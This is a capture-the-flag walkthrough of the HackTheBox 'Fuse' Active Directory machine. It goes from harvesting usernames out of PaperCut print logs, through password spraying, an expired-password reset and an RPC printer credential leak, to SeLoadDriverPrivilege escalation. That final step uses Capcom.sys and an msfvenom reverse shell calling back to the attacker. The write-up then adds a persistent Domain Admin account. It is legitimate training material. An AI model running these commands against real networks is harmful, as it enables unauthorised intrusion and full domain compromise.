Fuse was an Easy-Medium level Active Directory Box. I first created list of potential usernames  and passwords from the website running on port 80. Using Kerbrute, I filtered valid usernames from it and sprayed the potential credentials towards it to discover expired password(Fabricorp01). I can change the password using impacket-smbpasswd but the password gets reset to default every other minute so I had to be quick. Logging in to RPC with the changed password, I can obtain password for user svc-print from the printer description, which spawns me a shell. For privilege escalation, I abused SeLoadDriverPrivilege and obtained shell as the system.


## Information Gathering
### Rustscan

Rustscan finds bunch of ports open. Based on the ports open, this server seems to be running Active Directory.

```bash
‚îå‚îÄ‚îÄ(yoon„âøkali)-[~/Documents/htb/fuse]
‚îî‚îÄ$ sudo rustscan --addresses 10.10.10.193 --range 1-65535
[sudo] password for yoon:

## Enumeration
### SMB - TCP 445

SMB rejects anonymous login listing:

`smbclient -N -L //10.10.10.193`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/fuse/image.png)



crackmapexec discovers the server as running **Windows server 2016** and shows the domain name **fabricorp.local** which I add to  `/etc/hosts`.

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/fuse/image-1.png)

### DNS UDP/TCP 53

DNS confirms the domain name fabricorp.local:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/fuse/image-5.png)

Zone transfer fails:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/fuse/image-4.png)


### LDAP - TCP 389

Although I already know domain name, I can reconfirm it using ldapsearch as such:

`ldapsearch -H ldap://10.10.10.193 -x -s base namingcontexts`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/fuse/image-7.png)

Unfortunately, ldap bind fails:

`ldapsearch -H ldap://10.10.10.193 -x -b "DC=fabricorp,DC=local"`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/fuse/image-8.png)


### HTTP - TCP 80

Going to 10.10.10.193 on web browser redirects me to `http://fuse.fabricorp.local`, which I add to `/etc/hosts`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/fuse/image-2.png)

The website is running **PaperCut** and it shows several past print logs:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/fuse/image-3.png)

Before moving on to enumerating website more, I will try looking for more subdomains:

`sudo gobuster vhost -u http://fabricorp.local --append-domain -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt `

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/fuse/image-6.png)

Unfortunately, **fuse.fabricorp.local** seems to be the only subdomain. 

### Potential Usernames

Using Burp Suite, I can map the website with more ease as such:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/fuse/image-9.png)

I see five **.csv** files according to what Burp Suite finds.

Each of the .csv files shows Users, printer, and document name that was used for printing. I will write down potential credentials for further enumeration later.
 
- pmerton and tlavel from the User column
- bnielson from the Document column

`http://fuse.fabricorp.local/papercut/logs/html/papercut-print-log-2020-05-29.htm`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/fuse/image-10.png)

- sthompson from the User column
- Fabricorp01 from the Document column

`http://fuse.fabricorp.local/papercut/logs/html/papercut-print-log-2020-05-30.htm`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/fuse/image-11.png)

- bhult and administrator from the User column

`http://fuse.fabricorp.local/papercut/logs/html/papercut-print-log-2020-06-10.htm`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/fuse/image-12.png)

Last two .csv files that Burp Suite finds seems to be sum for each month (May and June):

`http://fuse.fabricorp.local/papercut/logs/csv/monthly/papercut-print-log-2020-05.csv`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/fuse/image-13.png)

`http://fuse.fabricorp.local/papercut/logs/csv/monthly/papercut-print-log-2020-06.csv`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/fuse/image-14.png)

I see bunch of potential credentials here so I will create a list of credentials to perform attacks such as Kerbruting and AS-REP Roasting later on:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/fuse/image-19.png)


## Kerbrute 

I will Kerbrute using the potential credentials list made above:

`./kerbrute_linux_amd64 userenum -d fabricorp.local --dc 10.10.10.193 ~/Documents/htb/fuse/usernames.txt`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/fuse/image-20.png)

Kerbrute identifies several of them to be valid and I will save those users in a seperate file as such:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/fuse/image-21.png)

## AS-REP Roasting (Fail)

Now that I have valid usernames, I will move on to AS-REP Roasting:

`sudo GetNPUsers.py 'fabricorp.local/' -user users.txt -format hashcat -outputfile hashes.asreproast -dc-ip 10.10.10.193`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/fuse/image-22.png)

Unfortunately, none of them has DONT_REQUIRE_PREAUTH set.


## Shell as svc-print
### SMB Bruteroce

Since I have list of valid usernames and potential credentials, I will use those to bruteforce smb login:

`crackmapexec smb -u users.txt -p usernames.txt --continue-on-success 10.10.10.193`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/fuse/image-23.png)

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/fuse/image-24.png)

It see something uncommon here for **bhult**:**Fabricorp01** and **tlavel**:**Fabricorp01**.

This status typically occurs when the user's password has expired or when it's flagged for a mandatory change by the domain policy or administrator settings.

You can see that attempting to login through smbclient showing the same error. 

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/fuse/image-25.png)

### Change Password

With the old expired password, I can change it to a new one using **impacket-smbpasswd** as such:

`impacket-smbpasswd tlavel@10.10.10.193`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/fuse/image-26.png)

Now the password should be newly set to **Password123!!!**

I can conform this by listing smb shares as tlavel with newly changed password:

`smbclient -L //10.10.10.193 -U tlavel`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/fuse/image-27.png)

I want to enumerate as tlavel but it turns out the password keeps on getting reset to the default one every other minute. Because of this, I had to move very quickly during enumeration.

### RPC as tlavel

I had no success enumerating anything juicy from SMB so I will move on to enumerating RPC.

I will first `querydispinfo` and see if there's any interesting information on description and add the users to my user list:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/fuse/image-28.png)




Since the web app is running software related to printers, I will query `enumprinters` and it reveals the password: **$fab@s3Rv1ce$1**

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/fuse/image-29.png)

### Evil-Winrm

Now I will spray the password to the list of valid users and it turns out **svc-print** is using the found password:

`crackmapexec smb 10.10.10.193 -u users.txt -p '$fab@s3Rv1ce$1`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/fuse/image-30.png)

Luckily, svc-print is in the remote management group and it seems that I can sign-in through WinRM:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/fuse/image-31.png)

Now through **evil-winrm**, I have a shell as **svc-print**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/fuse/image-33.png)

## Privsec: svc-print to system

After running SharpHound.exe and Bloodhound, I will first mark user **svc-print** as owned:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/fuse/image-34.png)

I expected Active Directory style privilege escalation here but it seems like there's nothing much to be done here from svc-print to the domain:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/fuse/image-35.png)

Running PowerUp.ps1, it notices me on several interesting points:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/fuse/image-36.png)

One of them is about **Registry Autologons**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/fuse/image-38.png)

Unfortunately, default password is not shwon from it:

`reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/fuse/image-39.png)

Another interesting point that PowerUp.ps1 shows is **SeLoadDriverPrivilege**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/fuse/image-37.png)



## SeLoadDriverPrivilege

According to [Priv2Admin](https://github.com/gtworek/Priv2Admin), SeLoadDriverPrivilege got Admin level impact over the system:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/fuse/image-40.png)


### Exploitation

I will first upload the driver [eoploaddriver_x64.exe](https://github.com/k4sth4/SeLoadDriverPrivilege/blob/main/eoploaddriver_x64.exe), [Capcom.sys file](https://github.com/k4sth4/SeLoadDriverPrivilege/blob/main/Capcom.sys), [ExploitCapcom.exe](https://github.com/k4sth4/SeLoadDriverPrivilege/blob/main/ExploitCapcom.exe) on target's `C:\Windows\Temp`.


Now using **ExploitCapcom.exe** I will load **Capcom.sys** to target machine.

`.\ExploitCapcom.exe LOAD C:\Windows\Temp\Capcom.sys`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/fuse/image-41.png)

After successfully loading Capcom.sys I can now run any cmd as privilege user with EXPLOIT keyword as such:

`\ExploitCapcom.exe EXPLOIT whoami`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/fuse/image-42.png)

Now on my local Kali machine, I will create a reverse shell using **msfvenom**:

`sudo msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.6 LPORT=1337 -f exe > shell.exe`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/fuse/image-43.png)

After uploading the payload to the target, I will run it:

`.\ExploitCapcom.exe EXPLOIT shell.exe`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/fuse/image-44.png)

Now on my local listener, I have a shell as the system:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/fuse/image-45.png)

## Beyond Root
### Persistence

For persistence, I will add Domain Admin user **jadu** as such:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/fuse/image-46.png)

Now using evil-winrm, I have a stable Domain Admin shell:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/fuse/image-47.png)
